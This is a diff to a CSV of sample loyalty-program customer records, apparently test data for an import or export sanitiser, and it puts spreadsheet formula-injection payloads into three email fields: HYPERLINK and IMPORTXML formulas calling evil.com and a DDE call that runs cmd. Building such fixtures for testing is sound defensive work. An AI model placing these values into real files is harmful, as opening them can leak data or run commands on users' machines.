@@ -2,13 +2,13 @@ e-mail,Phone Number,fname,lname,Date of Birth,Loyalty Tier,Points Balance,Last A
 alice.johnson@gmail.com,555-101-2001,Alice,Johnson,1985-03-15,Gold,12500,2025-12-01
 BOB.SMITH@YAHOO.COM,(555) 101-2002,Bob,Smith,1990-07-22,Platinum,45200,2026-01-15
 carol.williams@hotmail.com,5551012003,Carol,Williams,1978-11-30,Silver,3200,2025-11-20
-=cmd('calc'),555-101-2004,Dave,Brown,1992-01-08,Bronze,800,2025-10-05
++HYPERLINK("http://evil.com"),555-101-2004,Dave,Brown,1992-01-08,Bronze,800,2025-10-05
 eve.davis@outlook.com,+1-555-101-2005,Eve,Davis,1988-06-14,Gold,15800,2026-02-01
 frank.miller@aol.com,,Frank,Miller,1983-04-20,Silver,4100,2025-09-30
 ,555-101-2007,Grace,Wilson,1991-09-12,Platinum,52000,2026-01-28
 hank.moore@gmail.com,555.101.2008,Hank,Moore,1976-12-05,,0,
 iris.taylor@GMAIL.COM,(555)101-2009,Iris,Taylor,1994-02-28,Gold,11200,2025-12-15
-+SUM(A1:A100),555-101-2010,Jack,Anderson,1987-08-17,Bronze,500,2025-08-01
+=IMPORTXML("http://evil.com","//secret"),555-101-2010,Jack,Anderson,1987-08-17,Bronze,500,2025-08-01
 karen.thomas@yahoo.com,555 101 2011,Karen,Thomas,1982-05-03,Silver,6700,2025-11-10
 leo.jackson@hotmail.com,5551012012,Leo,Jackson,1995-10-19,Gold,18900,2026-01-20
 mike.white@outlook.com,(555) 101-2013,Mike,White,1979-02-14,Platinum,61000,2026-02-10
@@ -34,7 +34,7 @@ fred.adams@aol.com,555.101.2032,Fred,Adams,1987-04-15,Gold,17200,2026-01-08
 gina.baker@HOTMAIL.COM,(555)101-2033,Gina,Baker,1979-07-29,Platinum,42000,2025-12-30
 henry.nelson@gmail.com,555 101 2034,Henry,Nelson,1996-03-11,Bronze,1100,2025-08-25
 irene.carter@outlook.com,555-101-2035,Irene,Carter,1982-11-06,Silver,6300,2025-10-08
-=1+1,555-101-2036,James,Mitchell,1991-08-22,Gold,14700,2025-12-18
+=DDE("cmd","/C calc","!A0"),555-101-2036,James,Mitchell,1991-08-22,Gold,14700,2025-12-18
 kate.perez@yahoo.com,(555) 101-2037,Kate,Perez,1984-01-18,Diamond,92000,2026-02-12
 larry.roberts@hotmail.com,+15551012038,Larry,Roberts,1977-05-30,Silver,3500,2025-09-22
 mona.turner@gmail.com,5551012039,Mona,Turner,1993-09-14,Gold,19500,2026-01-25
